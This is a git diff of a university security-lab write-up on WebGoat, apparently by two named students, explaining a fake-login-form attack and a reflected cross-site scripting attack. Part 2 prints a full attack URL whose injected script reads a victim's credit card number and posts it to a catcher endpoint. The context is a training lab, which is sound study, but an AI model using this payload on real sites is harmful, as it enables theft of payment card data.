@@ -1,6 +1,20 @@
 #Ching Hui, 1005219504, sam.hui@mail.utoronto.ca
 #Spencer Ball, 1004762599, spencer.ball@mail.utoronto.ca
 
-Part 1 Explanation:
 
+Part 1 Explanation:
 Searching the attack code will render a login interface containing two input fields, username and password, and a submit button. After submitting, these two fields will be sent to the catcher servlet
+
+
+Part 2 Explanation:
+The vulnerability exists in the input field (input2) for the three digit access code. The unencoded attack URL is as follows:
+"
+http://localhost:8010/WebGoat/start.mvc#attack/297061215/900?input1=123&input2=
+<script>
+		var cardNumber = document.getElementsByName("input1")[0].value;
+		var url = `http://localhost:8010/WebGoat/catcher?PROPERTY=yes&stolenCardNum=${cardNumber}`;
+		fetch(url, {method: "POST"});
+		document.getElementsByName("input2")[0].value = "000";
+</script>
+"
+The attack script is passed as a default value for input2. Then, when a user enters their credit card information and presses the Buy button, the script executes and posts the inserted credit card number to the catcher server.
